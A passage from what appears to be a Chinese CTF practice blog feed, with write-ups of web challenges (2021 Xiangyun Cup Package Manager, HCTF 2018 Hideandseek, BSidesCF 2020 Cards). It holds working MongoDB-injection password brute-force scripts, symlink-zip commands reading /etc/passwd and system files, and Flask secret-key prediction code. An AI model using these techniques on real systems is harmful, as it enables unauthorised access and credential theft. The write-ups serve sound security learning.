tmp                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1号是guest，2号就是这个了，还好不多，不然要跑死。</p><pre class="line-numbers language-none"><code class="language-none">username:sequeladminpassword:f5ec3af19f0d3679e7d5a148f4ac323d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[2021祥云杯]Package Manager 2021</title>
      <link href="/p/1706625664.html"/>
      <url>/p/1706625664.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[mongdb注入]</p><p>给了源码，是typescript，这倒是第一次见</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021/image-20211016103024123.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>感觉像是XSS。</p><p>没想到是SQL注入……</p><p>数据库是mongodb</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021/image-20211016104633903.png"></p><p>在index.ts中有字符串拼接，意味着可能存在sql注入</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021/image-20211016104746370.png"></p><p>而正则检测没有加<code>^$</code>,意味着后面可以加or条件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021%E7%A5%A5%E4%BA%91%E6%9D%AF-Package-Manager-2021/image-20211016104801318.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://c640f712-3bb6-4e54-9f67-c8110ecd6a1a.node4.buuoj.cn:81/auth"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=s:43UCQxzqHneiwEF-JP_ftZ0Aw1upXuCF.t58XyJ4BQ4rmP8Da+VdQzkHtAd1r4EkRUs9h/Zim3os"</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://0b48abc1-6069-445b-a187-54a0edbc8c7a.node4.buuoj.cn:81/packages/submit"</span><span class="token punctuation">,</span>    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://0b48abc1-6069-445b-a187-54a0edbc8c7a.node4.buuoj.cn:81"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">,</span>    <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        payload <span class="token operator">=</span> <span class="token string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[&#123;&#125;]=="&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        <span class="token comment"># print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"_csrf"</span><span class="token punctuation">:</span> <span class="token string">"2PzwJX5n-Y1qH02TLkz3_JXa_OBn2hpgU2G8"</span><span class="token punctuation">,</span>            <span class="token string">"token"</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token comment"># print(r.text)</span>        <span class="token keyword">if</span> <span class="token string">"Found. Redirecting to"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token comment"># print(payload)</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出密码，登录结束。</p><pre class="line-numbers language-none"><code class="language-none">!@#&amp;@&amp;@efefef*@((@))grgregret3r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mongdb注入没做过，还需要多积累。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> mongdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HCTF 2018]Hideandseek</title>
      <link href="/p/3370612058.html"/>
      <url>/p/3370612058.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[MAC|uuid.getnode|网卡]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014222905857.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014222916429.png"></p><p>有session，解一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014225146618.png"></p><p>随便上传了个zip，然后会解压显示，那很明显，用软连接</p><p>先试试/etc/passwd</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rm -f test &amp;&amp; rm -f test.zip &amp;&amp; ln -s &#x2F;etc&#x2F;passwd test &amp;&amp; zip -ry test.zip test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014223537047.png"></p><p>可行，接下来就是尝试读取flag了</p><p>先试了下/flag,不太行，看来flag不在这</p><p>读取下<code>/proc/self/environ</code></p><p>中间件是uwsgi</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014224449417.png"></p><p>再读取下/app/uwsgi.ini</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rm -f test &amp;&amp; rm -f test.zip &amp;&amp; ln -s &#x2F;app&#x2F;uwsgi.ini test &amp;&amp; zip -ry test.zip test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014224657061.png"></p><p>读了下/app/main.py，没什么内容，应该不是真正的main</p><p>看了下网上的wp，不知道怎么做到的触发flask报错，然后就会把路径爆出来</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014225914167.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>session<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> request<span class="token punctuation">,</span>Response<span class="token keyword">import</span> uuid<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">import</span> flag<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> osrandom<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'./uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">1024</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'zip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \           filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    error <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>error <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> forbidden<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> user<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    password<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> username <span class="token operator">!=</span> <span class="token string">''</span> <span class="token keyword">and</span> password <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'the_file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'the_file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        file_save_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'This file already exists'</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'This file is not a zipfile'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        extract_path <span class="token operator">=</span> file_save_path <span class="token operator">+</span> <span class="token string">'_'</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'unzip -n '</span> <span class="token operator">+</span> file_save_path <span class="token operator">+</span> <span class="token string">' -d '</span><span class="token operator">+</span> extract_path<span class="token punctuation">)</span>        read_obj <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat '</span> <span class="token operator">+</span> extract_path <span class="token operator">+</span> <span class="token string">'/*'</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> read_obj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        read_obj<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm -rf '</span> <span class="token operator">+</span> extract_path<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token boolean">None</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>file_save_path<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span> <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'aGN0Zg=='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> error<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment">#app.run(debug=True)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">10008</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是获取SECRET_KEY</p><p>关于uuid，这里有相关记录<a href="https://syunaht.com/p/358833585.html#toc-heading-2">刷题笔记:[CISCN2019 华东南赛区]Web4</a></p><p>先读取<code>/sys/class/net/eth0/address</code></p><pre class="line-numbers language-none"><code class="language-none">rm -f test &amp;&amp; rm -f test.zip &amp;&amp; ln -s &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address test &amp;&amp; zip -ry test.zip test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回</p><pre class="line-numbers language-none"><code class="language-none">02:42:ac:10:9d:8b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> randommac <span class="token operator">=</span> <span class="token string">"02:42:ac:10:9d:8b"</span>temp <span class="token operator">=</span> mac<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>mac <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>mac<span class="token punctuation">)</span>randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成key为28.882339309493887</p><p>构造session，结束</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HCTF-2018-Hideandseek/image-20211014230919725.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BSidesCF 2020]Cards</title>
      <link href="/p/742807103.html"/>
      <url>/p/742807103.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Cards/image-20211014214252629.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>原来是打牌游戏。</p><p>看下cookie，是空的。</p><p>抓个包吧。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Cards/image-20211014214712559.png"></p><p>还有js代码能看，但不知道怎样才能拿到flag。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Cards/image-20211014214707424.png"></p><p>啊 这个能看到规则</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Cards/image-20211014215709743.png"></p><p>大概就是赢到100000然后拿flag吧</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Cards/image-20211014221306500.png"></p><p>还以为是真的要想办法改点什么东西，没想到真的要通过打牌</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsstart <span class="token operator">=</span> <span class="token string">"http://e55998dd-c347-4c45-b0c8-dc9ede19d51e.node3.buuoj.cn/api"</span>deal <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token string">"/deal"</span><span class="token comment"># 开局</span>state <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"SecretState"</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 下注</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>deal<span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Bet"</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"SecretState"</span><span class="token punctuation">:</span> state<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> resp<span class="token punctuation">[</span><span class="token string">'GameState'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Blackjack'</span><span class="token punctuation">:</span>        state <span class="token operator">=</span> resp<span class="token punctuation">[</span><span class="token string">'SecretState'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">[</span><span class="token string">'Balance'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> resp<span class="token punctuation">[</span><span class="token string">'Balance'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我们在每次请求都会有一个SecretState参数，用来保存游戏状态，并且在客户端和服务端同步。这个参数没法篡改。每次请求，服务端都会生成一个新的SecretState，但是旧的SecretState并不失效，问题就出在于此。<br>游戏如果赢了，就更新SecretState，如果输了，则不更新SecretState。这样就可以达到类似一种分数只增不减的效果。<br>但是有个问题，下注之后要开牌的话，必须得用新的SecretState，而下注的时候分数已经扣了，这样输的状态依然存在。<br>这就需要利用21点里一个规则，如果先发的2张牌已经是21点（black jack），则直接赢。这种状态下可以省去开牌那一步。</p></blockquote><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/solitudi/article/details/109186061">https://blog.csdn.net/solitudi/article/details/109186061</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[HFCTF 2021 Final]easyflask</title>
      <link href="/p/651701872.html"/>
      <url>/p/651701872.html</url>
      
